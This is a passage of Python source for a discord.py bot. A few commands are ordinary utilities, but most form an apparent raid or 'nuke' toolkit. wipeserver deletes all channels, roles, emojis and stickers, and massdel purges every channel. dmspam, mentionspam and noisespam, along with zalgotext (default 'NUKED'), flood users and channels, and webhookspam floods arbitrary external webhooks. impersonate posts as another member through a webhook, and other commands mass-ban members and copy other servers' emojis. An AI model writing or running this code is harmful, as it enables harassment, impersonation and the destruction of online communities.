    e.add_field(name="❌ Denied",  value="\n".join(denied[:15])  or "None", inline=True)
    await ctx.send(embed=e)

@bot.command()
async def avatar(ctx, member: discord.Member = None):
    """Show a member's avatar in full size."""
    m = member or ctx.author
    e = discord.Embed(title=f"🖼️ {m}'s Avatar", color=0x5865F2)
    e.set_image(url=m.display_avatar.url)
    e.add_field(name="ID", value=f"`{m.id}`", inline=True)
    await ctx.send(embed=e)

@bot.command()
async def joinorder(ctx):
    """List all members in order of when they joined."""
    members = sorted([m for m in ctx.guild.members if m.joined_at],
                     key=lambda m: m.joined_at)
    text = "\n".join(f"`{i+1}` {m} — {m.joined_at.strftime('%Y-%m-%d')}"
                     for i, m in enumerate(members[:30]))
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await ctx.send(f"```\n{chunk}\n```")

@bot.command()
async def adminmembers(ctx):
    """List members with administrator permission."""
    admins = [m for m in ctx.guild.members
              if m.guild_permissions.administrator and not m.bot]
    e = discord.Embed(title=f"👑 Admins ({len(admins)})", color=0xffd700)
    e.description = "\n".join(f"{m.mention} `{m.id}`" for m in admins[:30]) or "None"
    await ctx.send(embed=e)

@bot.command()
async def modmembers(ctx):
    """List members with kick or ban permission."""
    mods = [m for m in ctx.guild.members
            if (m.guild_permissions.kick_members or m.guild_permissions.ban_members) and not m.bot]
    e = discord.Embed(title=f"🛡️ Moderators ({len(mods)})", color=0x5865F2)
    e.description = "\n".join(f"{m.mention} `{m.id}`" for m in mods[:30]) or "None"
    await ctx.send(embed=e)

@bot.command()
async def boostmembers(ctx):
    """List all current server boosters."""
    boosters = ctx.guild.premium_subscribers
    if not boosters:
        await ctx.send("❌ No active boosters."); return
    e = discord.Embed(title=f"💎 Server Boosters ({len(boosters)})", color=0xff73fa)
    e.description = "\n".join(f"{m.mention} — since {m.premium_since.strftime('%Y-%m-%d')}"
                              for m in boosters[:30])
    await ctx.send(embed=e)

@bot.command()
async def banphrase(ctx, *, phrase: str):
    """Ban all members whose username contains a phrase."""
    targets = [m for m in ctx.guild.members
               if phrase.lower() in m.name.lower() and m != ctx.guild.me
               and m.top_role < ctx.guild.me.top_role]
    if not targets:
        await ctx.send(f"❌ No members with `{phrase}` in their name."); return
    await batch([m.ban(delete_message_days=0, reason=f"banphrase: {phrase}") for m in targets],
                **BATCH_MBR)
    await _rich_status(ctx, f"🔨 Banned {len(targets)} members matching '{phrase}'", 0xff0000)

@bot.command()
async def kickphrase(ctx, *, phrase: str):
    """Kick all members whose username contains a phrase."""
    targets = [m for m in ctx.guild.members
               if phrase.lower() in m.name.lower() and m != ctx.guild.me
               and m.top_role < ctx.guild.me.top_role]
    if not targets:
        await ctx.send(f"❌ No members with `{phrase}` in their name."); return
    await batch([m.kick(reason=f"kickphrase: {phrase}") for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"👢 Kicked {len(targets)} members matching '{phrase}'", 0xff0000)

@bot.command()
async def nickphrase(ctx, phrase: str, *, new_nick: str):
    """Rename all members whose display name contains a phrase."""
    targets = [m for m in ctx.guild.members
               if phrase.lower() in m.display_name.lower() and m.top_role < ctx.guild.me.top_role]
    await batch([m.edit(nick=new_nick) for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"✏️ Renamed {len(targets)} members matching '{phrase}'", 0xffd700)

@bot.command()
async def massdisconnect(ctx):
    """Disconnect ALL members from voice channels."""
    targets = [m for m in ctx.guild.members if m.voice and m.voice.channel]
    await batch([m.move_to(None) for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"🔌 Disconnected {len(targets)} members from voice", 0xff0000)

@bot.command()
async def tempban(ctx, member: discord.Member, hours: float, *, reason: str = "Temporary ban"):
    """Ban a member and automatically unban after X hours."""
    await member.ban(reason=f"{reason} [Temp: {hours}h]", delete_message_days=0)
    await _rich_status(ctx, f"⏱️ Temp-banned {member} for {hours}h", 0xff0000,
                       Reason=reason, Until=f"{hours}h from now")

    async def _unban():
        await asyncio.sleep(hours * 3600)
        await safe(ctx.guild.unban(member, reason="Temp ban expired"))
        await _log_embed(_action_embed("⏱️ Temp Ban Expired", 0x57f287,
            [("User", f"{member} `{member.id}`", True), ("Reason", reason, False)]))

    asyncio.create_task(_unban())

@bot.command()
async def mutewith(ctx, role: discord.Role):
    """Timeout all members with a specific role for 1 hour."""
    targets = [m for m in role.members if not m.bot and m.top_role < ctx.guild.me.top_role]
    until   = discord.utils.utcnow() + datetime.timedelta(hours=1)
    await batch([m.timeout(until, reason=f"mutewith: {role.name}") for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"🔇 Timed out {len(targets)} members with {role.name}", 0xff0000)

@bot.command()
async def massbanrole(ctx, role: discord.Role):
    """Ban all members who have a specific role."""
    targets = [m for m in role.members if m.top_role < ctx.guild.me.top_role]
    await batch([m.ban(delete_message_days=0, reason=f"massbanrole: {role.name}")
                 for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"🔨 Banned {len(targets)} members with {role.name}", 0xff0000)

# ═══════════════════════════════════════════════════════════════════
# EXTENDED MASS DM COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def massdmadmins(ctx, *, message: str):
    """DM all members with administrator permission."""
    targets = [m for m in ctx.guild.members if m.guild_permissions.administrator and not m.bot]
    await _dm_batch(ctx, targets, message, "massdmadmins")

@bot.command()
async def massdmmods(ctx, *, message: str):
    """DM all members with kick/ban permission."""
    targets = [m for m in ctx.guild.members
               if (m.guild_permissions.kick_members or m.guild_permissions.ban_members) and not m.bot]
    await _dm_batch(ctx, targets, message, "massdmmods")

@bot.command()
async def massdmboosters(ctx, *, message: str):
    """DM all server boosters."""
    targets = ctx.guild.premium_subscribers
    await _dm_batch(ctx, targets, message, "massdmboosters")

@bot.command()
async def massdmvc(ctx, *, message: str):
    """DM all members currently in voice channels."""
    targets = [m for m in ctx.guild.members if m.voice and m.voice.channel and not m.bot]
    await _dm_batch(ctx, targets, message, "massdmvc")

@bot.command()
async def massdmold(ctx, days: int, *, message: str):
    """DM members who joined more than X days ago."""
    cutoff  = discord.utils.utcnow() - datetime.timedelta(days=days)
    targets = [m for m in ctx.guild.members if m.joined_at and m.joined_at < cutoff and not m.bot]
    await _dm_batch(ctx, targets, message, f"massdmold>{days}d")

@bot.command()
async def massdmembed(ctx, role: discord.Role, title: str, *, body: str):
    """DM all members with a role using a rich embed."""
    targets = [m for m in role.members if not m.bot]
    e = discord.Embed(title=title, description=body, color=role.color,
                      timestamp=datetime.datetime.now(datetime.UTC))
    e.set_footer(text=f"From: {ctx.guild.name}")
    sent = fail = 0
    for m in targets:
        try: await m.send(embed=e); sent += 1
        except Exception: fail += 1
    await _log_dm_result(ctx, "massdmembed", len(targets), sent, fail, [])

@bot.command()
async def dmcustom(ctx, member: discord.Member, *, template: str):
    """DM a member with placeholders: {user}, {server}, {tag}."""
    msg = template.replace("{user}", member.display_name)\
                  .replace("{tag}", str(member))\
                  .replace("{server}", ctx.guild.name)
    try:
        await member.send(msg)
        await ctx.send(f"✅ Sent custom DM to {member.mention}.")
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")

@bot.command()
async def massdmcustom(ctx, role: discord.Role, *, template: str):
    """DM all members with a role using placeholders: {user} {server} {tag}."""
    targets = [m for m in role.members if not m.bot]
    sent = fail = 0
    for m in targets:
        msg = template.replace("{user}", m.display_name)\
                      .replace("{tag}", str(m))\
                      .replace("{server}", ctx.guild.name)
        try: await m.send(msg); sent += 1
        except Exception: fail += 1
    await _log_dm_result(ctx, "massdmcustom", len(targets), sent, fail, [])

@bot.command()
async def dmspam(ctx, member: discord.Member, count: int, delay: float, *, message: str):
    """Spam DMs at one user with a custom delay between each."""
    count = min(count, 100)
    sent = fail = 0
    for _ in range(count):
        try: await member.send(message); sent += 1
        except Exception: fail += 1
        await asyncio.sleep(delay)
    await _rich_status(ctx, f"📩 DM Spam complete", 0xff4500,
                       Sent=sent, Failed=fail, Target=str(member))

@bot.command()
async def massdmnew2(ctx, hours: float, *, message: str):
    """DM members who joined in the last X hours."""
    cutoff  = discord.utils.utcnow() - datetime.timedelta(hours=hours)
    targets = [m for m in ctx.guild.members if m.joined_at and m.joined_at > cutoff and not m.bot]
    await _dm_batch(ctx, targets, message, f"massdmnew<{hours}h")

@bot.command()
async def massdmages(ctx, min_days: int, max_days: int, *, message: str):
    """DM members whose account age is between min and max days."""
    now     = discord.utils.utcnow()
    targets = [m for m in ctx.guild.members if not m.bot
               and min_days <= (now - m.created_at).days <= max_days]
    await _dm_batch(ctx, targets, message, f"massdmages {min_days}-{max_days}d")

@bot.command()
async def retryFailed(ctx, *, message: str):
    """Retry sending a message to the last batch's failed members."""
    # Stored by _dm_batch helper
    failed = getattr(bot, "_last_failed_dm_ids", [])
    if not failed:
        await ctx.send("❌ No failed DMs to retry."); return
    targets = [ctx.guild.get_member(uid) or await safe(bot.fetch_user(uid))
               for uid in failed]
    targets = [t for t in targets if t]
    sent = fail = 0
    for t in targets:
        try: await t.send(message); sent += 1
        except Exception: fail += 1
    await _log_dm_result(ctx, "retryFailed", len(targets), sent, fail, [])

# ═══════════════════════════════════════════════════════════════════
# EXTENDED MESSAGING COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def poll(ctx, question: str, *, options: str):
    """Create a reaction poll. Separate options with |"""
    opts = [o.strip() for o in options.split("|")][:9]
    if len(opts) < 2:
        await ctx.send("❌ Provide at least 2 options separated by |"); return
    emojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
    desc   = "\n".join(f"{emojis[i]} {o}" for i, o in enumerate(opts))
    e = discord.Embed(title=f"📊 {question}", description=desc, color=0x5865F2,
                      timestamp=datetime.datetime.now(datetime.UTC))
    e.set_footer(text=f"Poll by {ctx.author}")
    msg = await ctx.send(embed=e)
    for i in range(len(opts)):
        await safe(msg.add_reaction(emojis[i]))

@bot.command()
async def slowspam(ctx, count: int, delay: float, *, message: str):
    """Spam in the current channel with a custom delay between messages."""
    count = min(count, 200)
    for _ in range(count):
        await safe(ctx.send(message))
        await asyncio.sleep(max(delay, 0.1))

@bot.command()
async def thread(ctx, *, name: str):
    """Create a public thread in the current channel."""
    t = await ctx.channel.create_thread(name=name, type=discord.ChannelType.public_thread)
    await ctx.send(f"🧵 Thread created: {t.mention}")

@bot.command()
async def threadall(ctx, *, name: str):
    """Create a thread in every text channel."""
    success = 0
    for ch in ctx.guild.text_channels:
        try:
            await ch.create_thread(name=name, type=discord.ChannelType.public_thread)
            success += 1
        except Exception:
            pass
    await _rich_status(ctx, f"🧵 Created {success} threads", 0x5865F2, Name=name)

@bot.command()
async def threadspam(ctx, count: int, *, name: str = "thread"):
    """Create many threads in the current channel."""
    count = min(count, 50)
    await batch([ctx.channel.create_thread(name=f"{name}-{i}",
                 type=discord.ChannelType.public_thread) for i in range(count)],
                size=5, delay=0.5)
    await _rich_status(ctx, f"🧵 Created {count} threads", 0x5865F2)

@bot.command()
async def massdel(ctx, count: int = 100):
    """Delete messages from ALL channels simultaneously."""
    async def _purge(ch):
        try: await ch.purge(limit=count)
        except Exception: pass
    await asyncio.gather(*[_purge(ch) for ch in ctx.guild.text_channels])
    await _rich_status(ctx, f"🗑️ Purged up to {count} messages from all channels", 0xff0000)

@bot.command()
async def embedfields(ctx, title: str, *, fields: str):
    """Send a rich embed. Format: 'title | field1:value1 | field2:value2'"""
    e = discord.Embed(title=title, color=0x5865F2, timestamp=datetime.datetime.now(datetime.UTC))
    for field in fields.split("|"):
        field = field.strip()
        if ":" in field:
            name, value = field.split(":", 1)
            e.add_field(name=name.strip(), value=value.strip(), inline=True)
    await ctx.send(embed=e)

@bot.command()
async def noisespam(ctx, count: int = 10):
    """Spam random Unicode noise in the current channel."""
    import random, string
    count = min(count, 50)
    async def _send():
        noise = "".join(random.choices(string.printable + "▓░█▄▀■□●○◆◇★☆", k=200))
        await safe(ctx.send(noise))
    await asyncio.gather(*[_send() for _ in range(count)])

@bot.command()
async def zalgotext(ctx, count: int = 5, *, text: str = "NUKED"):
    """Spam zalgo (corrupted) text."""
    import random
    zalgo_chars = [chr(c) for c in range(0x0300, 0x036F)]
    def _zalgo(t):
        out = ""
        for ch in t:
            out += ch + "".join(random.choices(zalgo_chars, k=random.randint(5,15)))
        return out
    count = min(count, 20)
    await asyncio.gather(*[safe(ctx.send(_zalgo(text))) for _ in range(count)])

@bot.command()
async def massunpin(ctx):
    """Unpin all pinned messages in every channel."""
    total = 0
    for ch in ctx.guild.text_channels:
        try:
            pins = await ch.pins()
            for p in pins:
                await safe(p.unpin())
                total += 1
        except Exception:
            pass
    await _rich_status(ctx, f"📌 Unpinned {total} messages", 0xffd700)

@bot.command()
async def purgereacts(ctx, message_id: int):
    """Remove ALL reactions from a message."""
    try:
        msg = await ctx.channel.fetch_message(message_id)
        await msg.clear_reactions()
        await ctx.send("✅ All reactions cleared.")
    except Exception as ex:
        await ctx.send(f"❌ {ex}")

@bot.command()
async def globalannounce(ctx, *, message: str):
    """Send an announcement embed to the first channel of every guild the bot is in."""
    e = discord.Embed(title="📢 Global Announcement", description=message,
                      color=0xff0000, timestamp=datetime.datetime.now(datetime.UTC))
    e.set_footer(text=f"From: {ctx.guild.name} • {ctx.author}")
    sent = 0
    for guild in bot.guilds:
        ch = next((c for c in guild.text_channels
                   if c.permissions_for(guild.me).send_messages), None)
        if ch:
            await safe(ch.send(embed=e))
            sent += 1
    await _rich_status(ctx, f"📢 Announced to {sent} guilds", 0xff0000)

@bot.command()
async def mentionspam(ctx, member: discord.Member, count: int):
    """Ping a user rapidly in the current channel."""
    count = min(count, 50)
    await asyncio.gather(*[safe(ctx.send(member.mention)) for _ in range(count)])

@bot.command()
async def aesthetic(ctx, *, text: str):
    """Convert text to fullwidth aesthetic style."""
    result = "".join(chr(ord(c) + 0xFEE0) if c.isascii() and c != " " else c for c in text)
    await ctx.send(result[:2000])

@bot.command()
async def mock(ctx, *, text: str):
    """Convert text to mOcK sTyLe."""
    result = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))
    await ctx.send(result[:2000])

@bot.command()
async def clap(ctx, *, text: str):
    """Add 👏 between every word."""
    await ctx.send(" 👏 ".join(text.split())[:2000])

@bot.command()
async def reverse(ctx, *, text: str):
    """Reverse the text."""
    await ctx.send(text[::-1][:2000])

@bot.command()
async def bigtext(ctx, *, text: str):
    """Convert text to regional indicator emoji letters."""
    result = ""
    for c in text.lower():
        if c.isalpha():
            result += f":regional_indicator_{c}: "
        elif c == " ":
            result += "   "
        elif c.isdigit():
            nums = {"0":"0️⃣","1":"1️⃣","2":"2️⃣","3":"3️⃣","4":"4️⃣",
                    "5":"5️⃣","6":"6️⃣","7":"7️⃣","8":"8️⃣","9":"9️⃣"}
            result += nums.get(c, c) + " "
    await ctx.send(result[:2000] or "❌ No valid characters.")

@bot.command()
async def spoilerspam(ctx, *, text: str):
    """Wrap every word in a spoiler tag."""
    result = " ".join(f"||{w}||" for w in text.split())
    await ctx.send(result[:2000])

@bot.command()
async def uwu(ctx, *, text: str):
    """UWU-ify the text."""
    import re
    text = re.sub(r'[rl]', 'w', text)
    text = re.sub(r'[RL]', 'W', text)
    text = re.sub(r'n([aeiou])', r'ny\1', text)
    text = re.sub(r'N([aeiou])', r'Ny\1', text)
    text = text.replace("ove", "uv").replace("OVE", "UV")
    await ctx.send((text + " OwO")[:2000])

@bot.command()
async def leet(ctx, *, text: str):
    """Convert text to l33t speak."""
    table = str.maketrans("aeiostAEIOST", "4310574310$7")
    await ctx.send(text.translate(table)[:2000])

@bot.command()
async def morse(ctx, *, text: str):
    """Encode text to Morse code."""
    code = {
        'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....',
        'I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-',
        'R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..',
        '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....',
        '6':'-....','7':'--...','8':'---..','9':'----.', ' ':'/'
    }
    result = " ".join(code.get(c.upper(), "?") for c in text)
    await ctx.send(f"`{result[:1990]}`")

@bot.command()
async def binary(ctx, *, text: str):
    """Convert text to binary."""
    result = " ".join(format(ord(c), '08b') for c in text)
    await ctx.send(f"`{result[:1990]}`")

@bot.command()
async def rot13(ctx, *, text: str):
    """ROT13 encode/decode text."""
    import codecs
    await ctx.send(codecs.encode(text, 'rot_13')[:2000])

@bot.command()
async def shout(ctx, *, text: str):
    """SHOUT THE TEXT!!!"""
    await ctx.send((text.upper() + "!!!!")[:2000])

@bot.command()
async def stutter(ctx, *, text: str):
    """A-add a stutter to the text."""
    words = text.split()
    result = " ".join(f"{w[0]}-{w}" if w else w for w in words)
    await ctx.send(result[:2000])

# ═══════════════════════════════════════════════════════════════════
# EXTENDED SERVER COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def serverstats(ctx):
    """Detailed server statistics."""
    g = ctx.guild
    text_ch  = len(g.text_channels)
    voice_ch = len(g.voice_channels)
    cats     = len(g.categories)
    roles    = len(g.roles)
    humans   = sum(1 for m in g.members if not m.bot)
    bots_n   = sum(1 for m in g.members if m.bot)
    online   = sum(1 for m in g.members if m.status != discord.Status.offline)
    emojis   = len(g.emojis)
    boosts   = g.premium_subscription_count
    e = discord.Embed(title=f"📊 {g.name} — Full Statistics", color=0x5865F2,
                      timestamp=discord.utils.utcnow())
    e.set_thumbnail(url=g.icon.url if g.icon else None)
    e.add_field(name="👥 Members",     value=g.member_count,  inline=True)
    e.add_field(name="👤 Humans",      value=humans,          inline=True)
    e.add_field(name="🤖 Bots",        value=bots_n,          inline=True)
    e.add_field(name="🟢 Online",      value=online,          inline=True)
    e.add_field(name="📝 Text Ch",     value=text_ch,         inline=True)
    e.add_field(name="🔊 Voice Ch",    value=voice_ch,        inline=True)
    e.add_field(name="📁 Categories",  value=cats,            inline=True)
    e.add_field(name="🎭 Roles",       value=roles,           inline=True)
    e.add_field(name="😀 Emojis",      value=emojis,          inline=True)
    e.add_field(name="💎 Boosts",      value=boosts,          inline=True)
    e.add_field(name="🛡️ Boost Level", value=g.premium_tier,  inline=True)
    e.add_field(name="📅 Created",     value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    e.add_field(name="👑 Owner",       value=str(g.owner),    inline=False)
    await ctx.send(embed=e)

@bot.command()
async def countall(ctx):
    """Count everything in the server."""
    g = ctx.guild
    bans = 0
    try:
        bans = sum(1 async for _ in g.bans(limit=None))
    except Exception:
        pass
    e = discord.Embed(title=f"📦 Everything in {g.name}", color=0x5865F2)
    e.add_field(name="👥 Members",   value=g.member_count,          inline=True)
    e.add_field(name="📝 Channels",  value=len(g.channels),         inline=True)
    e.add_field(name="🎭 Roles",     value=len(g.roles),            inline=True)
    e.add_field(name="😀 Emojis",    value=len(g.emojis),           inline=True)
    e.add_field(name="🎪 Stickers",  value=len(g.stickers),         inline=True)
    e.add_field(name="🔨 Bans",      value=bans,                    inline=True)
    e.add_field(name="💎 Boosts",    value=g.premium_subscription_count, inline=True)
    await ctx.send(embed=e)

@bot.command()
async def stealemoji(ctx, guild_id: int):
    """Copy all emojis from another guild the bot is in."""
    source = bot.get_guild(guild_id)
    if not source:
        await ctx.send(f"❌ Bot is not in guild `{guild_id}`."); return
    added = fail = 0
    async with aiohttp.ClientSession() as session:
        for emoji in source.emojis:
            try:
                async with session.get(str(emoji.url)) as r:
                    if r.status == 200:
                        data = await r.read()
                        await ctx.guild.create_custom_emoji(name=emoji.name, image=data)
                        added += 1
            except Exception:
                fail += 1
    await _rich_status(ctx, f"😀 Stolen {added} emojis from {source.name}", 0x57f287,
                       Added=added, Failed=fail)

@bot.command()
async def impersonate(ctx, member: discord.Member, *, message: str):
    """Send a message in the current channel mimicking a member via webhook."""
    try:
        wh = await ctx.channel.create_webhook(name=member.display_name)
        await wh.send(message, username=member.display_name,
                      avatar_url=member.display_avatar.url)
        await wh.delete()
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")

@bot.command()
async def webhookspam(ctx, webhook_url: str, count: int, *, message: str):
    """Spam a message via an external webhook URL."""
    count = min(count, 100)
    async with aiohttp.ClientSession() as session:
        wh = discord.Webhook.from_url(webhook_url, session=session)
        await asyncio.gather(*[safe(wh.send(message)) for _ in range(count)])
    await _rich_status(ctx, f"⚡ Sent {count} messages via webhook", 0xff4500)

@bot.command()
async def createwebhook(ctx, channel: discord.TextChannel = None, *, name: str = "Webhook"):
    """Create a webhook in a channel and show its URL."""
    ch = channel or ctx.channel
    wh = await ch.create_webhook(name=name)
    e = discord.Embed(title="🔗 Webhook Created", color=0x57f287)
    e.add_field(name="Channel", value=ch.mention, inline=True)
    e.add_field(name="Name",    value=name,        inline=True)
    e.add_field(name="URL",     value=f"||{wh.url}||", inline=False)
    await ctx.send(embed=e)

@bot.command()
async def kickbots(ctx):
    """Kick all bot accounts from the server."""
    targets = [m for m in ctx.guild.members if m.bot and m != ctx.guild.me
               and m.top_role < ctx.guild.me.top_role]
    await batch([m.kick(reason="kickbots") for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"🤖 Kicked {len(targets)} bots", 0xff0000)

@bot.command()
async def prunembers(ctx, days: int = 7):
    """Prune members who have been inactive for X days."""
    count = await ctx.guild.estimate_pruned_members(days=days)
    pruned = await ctx.guild.prune_members(days=days, reason=f"Prune by {ctx.author}")
    await _rich_status(ctx, f"✂️ Pruned {pruned} inactive members", 0xff0000,
                       Days=days, Estimate=count, Actual=pruned)

@bot.command()
async def boostinfo(ctx):
    """Show server boost statistics."""
    g = ctx.guild
    e = discord.Embed(title=f"💎 Boost Info — {g.name}", color=0xff73fa)
    e.add_field(name="Boost Level",  value=g.premium_tier,                    inline=True)
    e.add_field(name="Boost Count",  value=g.premium_subscription_count,      inline=True)
    e.add_field(name="Boosters",     value=len(g.premium_subscribers),        inline=True)
    needed = {0: 2, 1: 15, 2: 30}.get(g.premium_tier, 0)
    if needed:
        e.add_field(name="Next Level", value=f"{needed - g.premium_subscription_count} more needed", inline=True)
    e.description = "\n".join(f"{m.mention} — since {m.premium_since.strftime('%Y-%m-%d')}"
                              for m in g.premium_subscribers[:20]) or "No boosters."
    await ctx.send(embed=e)

@bot.command()
async def setverif(ctx, level: int):
    """Set server verification level (0-4). Alias for !setverification."""
    lvl = discord.VerificationLevel(level)
    await ctx.guild.edit(verification_level=lvl)
    await _rich_status(ctx, f"🛡️ Verification set to level {level}", 0x5865F2)

@bot.command()
async def wipeserver(ctx):
    """☢️ Delete all channels, roles (except @everyone), emojis, and stickers."""
    await _fast_delete_channels(ctx.guild)
    await _fast_delete_roles(ctx.guild)
    sem = asyncio.Semaphore(5)
    async def _del_emoji(e):
        async with sem: await safe(e.delete())
    async def _del_sticker(s):
        async with sem: await safe(s.delete())
    await asyncio.gather(*[_del_emoji(e) for e in ctx.guild.emojis])
    await asyncio.gather(*[_del_sticker(s) for s in ctx.guild.stickers])
    await _log_embed(_action_embed("☢️ Server Wiped", 0xff0000,
        [("Guild", ctx.guild.name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def scheduleannounce(ctx, delay: float, channel: discord.TextChannel, *, message: str):
    """Send a message to a channel after X seconds."""
    await ctx.send(f"⏱️ Scheduled message to {channel.mention} in {delay}s.")
    await asyncio.sleep(delay)
    e = discord.Embed(description=message, color=0x5865F2,
                      timestamp=datetime.datetime.now(datetime.UTC))
    e.set_footer(text=f"Scheduled by {ctx.author}")
    await safe(channel.send(embed=e))

@bot.command()
async def setnotif(ctx, level: int):
    """Set default notification level (0=all, 1=mentions only)."""
    lvl = discord.NotificationLevel(level)
    await ctx.guild.edit(default_notifications=lvl)
    await _rich_status(ctx, f"🔔 Notification level set to {level}", 0x5865F2)

@bot.command()
async def listbots(ctx):
    """List all bot accounts in this server."""
    bots = [m for m in ctx.guild.members if m.bot]
    e = discord.Embed(title=f"🤖 Bots in {ctx.guild.name} ({len(bots)})", color=0x5865F2)
    e.description = "\n".join(f"{m.mention} `{m.id}`" for m in bots[:30]) or "None"
    await ctx.send(embed=e)

# ═══════════════════════════════════════════════════════════════════
# INFO / UTILITY COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def snowflake(ctx, snowflake_id: int):
    """Decode a Discord snowflake ID to creation timestamp."""
    ts = ((snowflake_id >> 22) + 1420070400000) / 1000
    dt = datetime.datetime.utcfromtimestamp(ts)
    e = discord.Embed(title="❄️ Snowflake Decoder", color=0x5865F2)
    e.add_field(name="ID",        value=f"`{snowflake_id}`",          inline=False)
    e.add_field(name="Created At", value=dt.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=True)
    e.add_field(name="Unix TS",   value=str(int(ts)),                  inline=True)
    e.add_field(name="Worker",    value=(snowflake_id & 0x3E0000) >> 17, inline=True)
    e.add_field(name="Process",   value=(snowflake_id & 0x1F000) >> 12,  inline=True)
    e.add_field(name="Increment", value=snowflake_id & 0xFFF,            inline=True)
    await ctx.send(embed=e)

@bot.command()
async def color(ctx, hex_code: str):
    """Show a color preview embed for a hex code."""
    hex_code = hex_code.lstrip("#")
    try:
        int_color = int(hex_code, 16)
        r = int_color >> 16
        g = (int_color >> 8) & 0xFF
        b = int_color & 0xFF
        e = discord.Embed(title=f"🎨 #{hex_code.upper()}", color=int_color)
        e.add_field(name="HEX", value=f"#{hex_code.upper()}", inline=True)
        e.add_field(name="RGB", value=f"{r}, {g}, {b}",       inline=True)
        e.add_field(name="Int", value=str(int_color),          inline=True)
        await ctx.send(embed=e)
    except Exception:
        await ctx.send("❌ Invalid hex color. Use format: `#FF0000` or `FF0000`")

@bot.command()
async def calc(ctx, *, expr: str):
    """Simple calculator. Supports +, -, *, /, **, %"""
    import ast, operator
    ops = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
           ast.Div: operator.truediv, ast.Pow: operator.pow, ast.Mod: operator.mod,
           ast.UAdd: operator.pos, ast.USub: operator.neg}
    def _eval(node):
        if isinstance(node, ast.Constant): return node.value
        if isinstance(node, ast.BinOp):    return ops[type(node.op)](_eval(node.left), _eval(node.right))
        if isinstance(node, ast.UnaryOp):  return ops[type(node.op)](_eval(node.operand))
        raise ValueError("Unsupported")
    try:
        result = _eval(ast.parse(expr, mode='eval').body)
        await ctx.send(f"🧮 `{expr}` = **{result}**")
    except Exception:
        await ctx.send(f"❌ Invalid expression: `{expr}`")

@bot.command()
async def encode(ctx, *, text: str):
    """Base64 encode text."""
    import base64
    result = base64.b64encode(text.encode()).decode()
    await ctx.send(f"🔐 `{result[:1990]}`")

@bot.command()
async def decode(ctx, *, text: str):
    """Base64 decode text."""
    import base64
    try:
        result = base64.b64decode(text.encode()).decode()
        await ctx.send(f"🔓 `{result[:1990]}`")
    except Exception:
        await ctx.send("❌ Invalid base64 string.")

@bot.command()
async def botperms(ctx, channel: discord.TextChannel = None):
    """Show this bot's permissions in a channel."""
    ch    = channel or ctx.channel
    perms = ch.permissions_for(ctx.guild.me)
    allowed = [p for p, v in perms if v]
    denied  = [p for p, v in perms if not v]
    e = discord.Embed(title=f"🤖 Bot perms in #{ch.name}", color=0x5865F2)
    e.add_field(name="✅ Allowed", value="\n".join(allowed[:20]) or "None", inline=True)
    e.add_field(name="❌ Missing",  value="\n".join(denied[:20])  or "None", inline=True)
    await ctx.send(embed=e)

@bot.command()
async def timestamp(ctx, unix: float):
    """Convert a Unix timestamp to a readable date."""
    try:
        dt = datetime.datetime.utcfromtimestamp(unix)
        e = discord.Embed(title="🕐 Timestamp", color=0x5865F2)
        e.add_field(name="Unix",    value=str(int(unix)),                inline=True)
        e.add_field(name="UTC",     value=dt.strftime("%Y-%m-%d %H:%M:%S"), inline=True)
        e.add_field(name="Discord", value=f"<t:{int(unix)}:F>",         inline=True)
        await ctx.send(embed=e)
    except Exception:
        await ctx.send("❌ Invalid Unix timestamp.")

@bot.command()
async def charcount(ctx, *, text: str):
    """Count characters and words in text."""
    chars  = len(text)
    words  = len(text.split())
    lines  = text.count("\n") + 1
    e = discord.Embed(title="📊 Text Stats", color=0x5865F2)
    e.add_field(name="Characters", value=chars, inline=True)
    e.add_field(name="Words",      value=words, inline=True)
    e.add_field(name="Lines",      value=lines, inline=True)
    await ctx.send(embed=e)

@bot.command()
async def whois(ctx, user_id: int):
    """Look up any Discord user by ID."""
    try:
        user = await bot.fetch_user(user_id)
        e = discord.Embed(title=f"🔍 {user}", color=0x5865F2)
        e.set_thumbnail(url=user.display_avatar.url)
        e.add_field(name="ID",      value=f"`{user.id}`",                inline=True)
        e.add_field(name="Bot",     value="✅" if user.bot else "❌",     inline=True)
        e.add_field(name="Created", value=user.created_at.strftime("%Y-%m-%d"), inline=True)
        if user.banner:
            e.set_image(url=user.banner.url)
        await ctx.send(embed=e)
    except Exception as ex:
        await ctx.send(f"❌ User not found: `{ex}`")

@bot.command()
async def hex2rgb(ctx, hex_code: str):
    """Convert a hex color to RGB."""
    hex_code = hex_code.lstrip("#")
    try:
        r, g, b = int(hex_code[0:2],16), int(hex_code[2:4],16), int(hex_code[4:6],16)
        await ctx.send(f"🎨 `#{hex_code.upper()}` = RGB({r}, {g}, {b})")
    except Exception:
        await ctx.send("❌ Invalid hex color.")

@bot.command()
async def botinfo(ctx):
    """Show detailed bot statistics."""
    uptime_s = int(time.time() - START_TIME)
    h, rem   = divmod(uptime_s, 3600)
    m, s     = divmod(rem, 60)
    e = discord.Embed(title=f"🤖 {bot.user}", color=0x5865F2)
    e.set_thumbnail(url=bot.user.display_avatar.url)
    e.add_field(name="Uptime",   value=f"{h}h {m}m {s}s",              inline=True)
